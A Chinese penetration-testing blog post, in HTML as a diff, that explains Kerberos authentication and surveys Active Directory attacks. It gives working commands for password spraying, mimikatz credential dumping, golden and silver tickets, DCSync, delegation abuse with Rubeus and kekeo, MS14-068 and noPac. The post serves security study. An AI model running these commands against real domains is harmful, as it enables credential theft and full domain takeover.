@@ -1,0 +1,430 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>Kerberos Attack | 『1nv_qaq&#39;s Blog』</title>
+    <meta name="author" content="1nv-qaq" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>wait wait wait...</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>『1NV_QAQ&#39;S BLOG』</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;『1NV_QAQ&#39;S BLOG』</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>Kerberos Attack</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/5/16
+        </span>
+        
+        <span class="category">
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                渗透测试
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #03a9f4">
+                    渗透测试
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>本文梳理Kerberos的相关攻击手法</p>
+<span id="more"></span>
+
+<p>Reference：《内网渗透体系建设》</p>
+<h1 id="Kerberos基础"><a href="#Kerberos基础" class="headerlink" title="Kerberos基础"></a>Kerberos基础</h1><p>域渗透中，Kerberos是最常用的，针对整个域的基础认证协议</p>
+<h2 id="Kerberos基础认证流程"><a href="#Kerberos基础认证流程" class="headerlink" title="Kerberos基础认证流程"></a>Kerberos基础认证流程</h2><ul>
+<li>Kerberos认证协议是基于票据（Ticket）的一种认证方式</li>
+<li>三部分：<ul>
+<li>用户（Client）</li>
+<li>服务器（Server）</li>
+<li><strong>K</strong>ey <strong>D</strong>istribution <strong>C</strong>enter（KDC，密钥分发中心）<ul>
+<li><strong>A</strong>uthentication <strong>S</strong>erver（AS，认证服务器）</li>
+<li><strong>T</strong>icket <strong>G</strong>ranting <strong>S</strong>erver（TGS，票据授权服务器）</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/Kerberos%20Attack/01.png" alt="img"></p>
+<ol>
+<li>AS_REQ：Client向AS发起AS_REQ</li>
+<li>AS_REP：AS使用Client密码哈希值进行解密，解密成功，返回用krbtgt的NTLM-hash加密的TGT票据<ol>
+<li>krbtgt是Kerberos中的一个特殊账户，用于存储和管理Ticket Granting Ticket(TGT)</li>
+<li>在Kerberos认证系统中，krbtgt账户是一个系统级别的账户</li>
+<li>TGT包含PAC，PAC包含Client的相关权限信息</li>
+<li>只有KDC能制作和查看PAC</li>
+<li>如果攻击者获取到了krbtgt hash，便可以任意伪造TGT，即黄金票据，从而跳过AS验证</li>
+</ol>
+</li>
+<li>TGS_REQ：Client通过TGT向TGS发起针对需要访问服务的TGS_REQ请求</li>
+<li>TGS_REP：TGS使用krbtgt的NTML-hash对TGT进行解密，解密成功便返回用服务NTLM-hash加密的TGS票据(ST)，并附带PAC<ol>
+<li>这里不论用户有没有访问服务的权限，只要TGT正确，就返回ST</li>
+</ol>
+</li>
+<li>AP_REQ：Client利用ST请求服务</li>
+<li>AP_REP：服务使用自己的NTLM-hash解密ST，如果结果正确，将PAC交给KDC解密，KDC由此判断是否有访问服务的权限<ol>
+<li>如果没有设置PAC，就不会交给KDC验证，这便是白银票据成功的原因</li>
+</ol>
+</li>
+</ol>
+<h2 id="Kerberos攻击分类"><a href="#Kerberos攻击分类" class="headerlink" title="Kerberos攻击分类"></a>Kerberos攻击分类</h2><p>Kerberos的攻击主要关注点为“票据”，即票据传递攻击Pass The Ticket(PTT)</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/Kerberos%20Attack/02.png" alt="img"></p>
+<h1 id="AS-REQ-AS-REP-attack"><a href="#AS-REQ-AS-REP-attack" class="headerlink" title="AS_REQ &amp; AS_REP attack"></a>AS_REQ &amp; AS_REP attack</h1><h2 id="域内用户枚举-密码喷洒攻击"><a href="#域内用户枚举-密码喷洒攻击" class="headerlink" title="域内用户枚举&amp;密码喷洒攻击"></a>域内用户枚举&amp;密码喷洒攻击</h2><p>本质就是爆破，利用Kerberos协议认证过程当用户不存在时，返回包提示错误，当用户名存在时，密码正确&#x2F;错误返回包也不同</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a></p>
+<p>域内用户枚举：<code>kerbrute_windows_amd64.exe userenum --dc x.x.x.x(域控ip) -d x.com(域名) x.txt(字典)</code></p>
+<p>密码喷洒攻击：<code>kerbrute_windows_amd64.exe passwordspray --dc x.x.x.x -d x.com x.txt 123.com</code></p>
+<h2 id="AS-REP-Roasting-attack"><a href="#AS-REP-Roasting-attack" class="headerlink" title="AS_REP Roasting attack"></a>AS_REP Roasting attack</h2><ul>
+<li>如果被攻击账号设置“不需要Kerberos预身份验证”，AS_REP的过程中就可以任意伪造用户名请求票据</li>
+<li>随后AS会将伪造请求的用户名NTLM hash加密后返回，于是便可以进行爆破</li>
+<li>但该攻击条件默认是不勾选的，因此可利用程度较低</li>
+</ul>
+<h2 id="Golden-Ticket-attack"><a href="#Golden-Ticket-attack" class="headerlink" title="Golden Ticket attack"></a>Golden Ticket attack</h2><ul>
+<li>在Kerberos认证中，每个用户的票据都是由krbtgt的NTLM hash加密生成的，因此获得krbtgt hash，便可以伪造任意用户的票据</li>
+<li>攻击需要：<ul>
+<li>域名</li>
+<li>域sid</li>
+<li>krbtgt hash</li>
+<li>伪造的用户</li>
+</ul>
+</li>
+<li>攻击过程：</li>
+</ul>
+<p>在DC上<code>mimikatz.exe &quot;LOG&quot; &quot;Privilege::Debug&quot; &quot;lsadump::lsa /patch&quot; &quot;exit&quot;</code></p>
+<p>得到krbtgt hash之后，利用mimikatz生成黄金票据并导入，<strong>注意这里传入的sid值要去掉最后一个“-”后面的内容</strong></p>
+<pre><code class="plaintext">kerberos::golden /admin:Administrator /domain:x.com /sid:x-x-x-x-x-x-x /krbtgt:[hash value] /ticket:ticket.kirbi
+
+Kerberos::ptt ticket.kirbi
+</code></pre>
+<h1 id="TGS-REQ-TGS-REP-attack"><a href="#TGS-REQ-TGS-REP-attack" class="headerlink" title="TGS_REQ &amp; TGS_REP attack"></a>TGS_REQ &amp; TGS_REP attack</h1><h2 id="Kerberoast-attack"><a href="#Kerberoast-attack" class="headerlink" title="Kerberoast attack"></a>Kerberoast attack</h2><ul>
+<li>SPN(Service Principal Name)是服务器所运行服务的唯一标识</li>
+<li>Kerberoast attack利用了TGS_REP阶段使用服务的NTML hash返回加密数据，对于域内的任何主机，都可以通过查询SPN，向域内的所有服务请求ST（因为KDC不会验证权限）</li>
+<li>爆破域用户的SPN（机器账户的SPN每30天会随机更换128个字符的密码），这里高度依赖爆破字典</li>
+</ul>
+<h2 id="Silver-Ticket-attack"><a href="#Silver-Ticket-attack" class="headerlink" title="Silver Ticket attack"></a>Silver Ticket attack</h2><p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/Kerberos%20Attack/03.png" alt="img"></p>
+<ul>
+<li>未配置PAC的情况下，通过伪造ST访问特定服务器上的部分服务</li>
+<li>如果得到DC机器账户的hash<ul>
+<li>使用白银票据访问其LDAP服务执行DCSync</li>
+<li>伪造CIFS服务实现远程文件访问</li>
+</ul>
+</li>
+<li>攻击需要：<ul>
+<li>域名</li>
+<li>域sid</li>
+<li>DC机器账户的hash</li>
+<li>伪造的任意用户名</li>
+</ul>
+</li>
+<li>攻击过程：</li>
+</ul>
+<p>在DC上<code>mimikatz.exe &quot;log&quot; &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;</code></p>
+<p>得到DC机器名的hash和域id<code>kerberos::golden /domain:x.com /sid:x-x-x-x-x-x-x /target: dc.x.com /service:ldap /rc4:机器hash /user:xxx /ptt lsadump::dcsync /domain:x.com /user:krbtgt</code></p>
+<p>获取krbtgt用户的hash从而制作黄金票据</p>
+<h2 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h2><p>委派：服务A和服务B不在同一台机器上，用户访问服务A的时候需要使用到服务B中的数据，服务A代用户请求服务B中的数据，这个过程称为委派</p>
+<h3 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h3><p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/Kerberos%20Attack/04.png" alt="img"></p>
+<p>上图中，当service1的服务账户开启了非约束委派，user访问service1时，service1会将user的TGT保存在内存中，于是service1便可以用user的身份访问域中任意user可以访问的服务，当这个user是域管理员时，便获得了域管理员权限，攻击过程如下：</p>
+<ol>
+<li>在域内主机查找非约束委派用户<ol>
+<li><code>AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType =805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</code></li>
+<li>当主机设置为非约束性委派的时候，其userAccountControl属性包含TRUSTED_FOR_DELEGATION这个flag值，对应0x80000</li>
+<li>其中524288对应0x80000，805306369对应0x0000000（代表机器账户）</li>
+</ol>
+</li>
+<li>可以利用Spooler打印机服务让域控主动连接开启非约束委派的服务<ol>
+<li>Spooler服务默认开启的情况下，域用户可以利用Windows打印系统远程协议（MS-RPRN）强制任何运行了Spooler服务的域内计算机通过Kerberos或NTLM对任何目标进行身份验证</li>
+<li>利用<a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample">SpoolSample</a>强制DC进行认证，从而抓取TGT</li>
+<li>Rubeus导入TGT：<code>Rubeus.exe ptt /ticket:base64</code></li>
+<li>mimikatz进行dscync获取hash值，制作黄金票据接管域控</li>
+</ol>
+</li>
+</ol>
+<h3 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h3><p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/Kerberos%20Attack/05.png" alt="img"></p>
+<p>微软在Windows Server 2003中引入约束委派，构建了S4U协议，具体可分为S4U2Self和S4U2proxy:</p>
+<ul>
+<li>S4U2self用于生成本身服务TGS票据<ul>
+<li>上图中service1代表用户请求的自身可转发ST</li>
+<li>不能以该用户身份请求其他服务</li>
+</ul>
+</li>
+<li>S4U2proxy用于“代理”相关用户申请其他服务票据<ul>
+<li>service1以S4U2self阶段的可转发ST代表用户申请请求service2的ST</li>
+<li>S4U2proxy过程中通过判断msds-allowedtdelegateto里的 SPN确定是否可以申请到service2的ST</li>
+</ul>
+</li>
+</ul>
+<p>上述过程中，如果获得了service1的权限，就可以伪造S4U先请求service1本身的ST，然后利用该ST伪造任意用户请求service2的ST：</p>
+<ol>
+<li><p>域内主机查找约束委派主机<code>Adfind.exe -b &quot;DC=xx,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</code></p>
+</li>
+<li><p>假设已获取该主机的相关权限，已经知道服务用户密码明文和hash值，用keoeo请求TGT<code>tgt::ask /user:win2008-web /domain:xx.com /NTLM:xxx /ticket:s4u.kirbi</code></p>
+</li>
+<li><p>伪造S4U，以Administrator用户权限访问受委派的服务<code>tgs::s4u /tgt:xxx.kirbi /user:Administrator/service:cifs/dc.xx.com</code></p>
+</li>
+<li><p>mimimikatz导入S4U2proxy阶段生成的ST</p>
+</li>
+</ol>
+<p>另：如果可以直接获取上述WIN2008-WEB机器账户的TGT，就可以直接利用Rubeus进行攻击<code>Rubeus.exe s4u /user:WIN2008-WEB$ /rc4:xxx[NTLM hash] /domain:xx.com /impersonateuser:Administrator /msdsspn:cifs/dc.xx.com /ptt</code></p>
+<h3 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h3><p>TLDR;</p>
+<p>:)</p>
+<p><a target="_blank" rel="noopener" href="https://exp10it.io/2023/08/resource-based-constrained-delegation-attack-summary/">https://exp10it.io/2023/08/resource-based-constrained-delegation-attack-summary/</a></p>
+<h1 id="PAC-Attack"><a href="#PAC-Attack" class="headerlink" title="PAC Attack"></a>PAC Attack</h1><h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><ul>
+<li>KDC无法正确检查PAC中的有效签名，因为其实现签名的加密允许所有的签名算法</li>
+<li>客户端可以制定不需要相关密钥的算法，例如MD5，便可以实现伪造构造PAC</li>
+</ul>
+<p><code>keoeo.exe &quot;exploit::ms14068 /domain:x.com /user:username /password:password /ptt&quot; &quot;exit&quot;</code></p>
+<h2 id="CVE-2021-42278-CVE-2021-42287"><a href="#CVE-2021-42278-CVE-2021-42287" class="headerlink" title="CVE-2021-42278 &amp; CVE-2021-42287"></a>CVE-2021-42278 &amp; CVE-2021-42287</h2><ul>
+<li>CVE-2021-42278<ul>
+<li>安全绕过漏洞，允许通过修改机器账户的sAMAccountName属性冒充域控</li>
+<li>与标准用户账户相比，机器账户名称末尾附加了<code>&quot;$&quot;</code>符号，但AD并没有验证域内机器账户中是否具有<code>&quot;$&quot;</code></li>
+</ul>
+</li>
+<li>CVE-2021-42287<ul>
+<li>允许通过冒充域控，使KDC创建高权限票据</li>
+</ul>
+</li>
+</ul>
+<p>攻击过程：</p>
+<ol>
+<li>创建一个机器用户，假设为<code>HACKME$</code></li>
+<li>清除机器账户<code>HACKME$</code>的<code>servicePrincipalName</code>属性</li>
+<li>修改机器账户<code>HACKME$</code> 的<code>sAMAccountName</code>属性，使其指向不带<code>&quot;$&quot;</code>符号的域控账户</li>
+<li>利用账户<code>DC-1</code>请求TGT</li>
+<li>将新建的机器账户的<code>sAMAccountName</code>属性恢复为其原始值<code>HACKME$</code></li>
+<li>利用S4U代表域管理员请求对应服务的服务票据ST</li>
+<li>伪造域管理员账户获得相应服务的ST</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-meditation-/articles/16619406.html">https://www.cnblogs.com/-meditation-/articles/16619406.html</a></p>
+<p><code>noPac.exe -domain x.com -user 1nvqaq -pass 12346abc /dc DC-1.x.com /mAccount HACKME /mPassword 123456 /service cifs /ptt</code></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2024 - 2025 『1nv_qaq&#39;s Blog』
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;1nv-qaq
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    <script src="/js/<fireworks.min.js>"></script>
+
+
+    <canvas
+    id="fireworks"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"
+></canvas>
+<script src="https://s4.zstatic.net/ajax/libs/animejs/3.2.1/anime.min.js"></script>
+<script src="/js/fireworks.min.js"></script>
+
+
+
+
+    
+    
+
+
+
+
+    
+</body>
+</html>
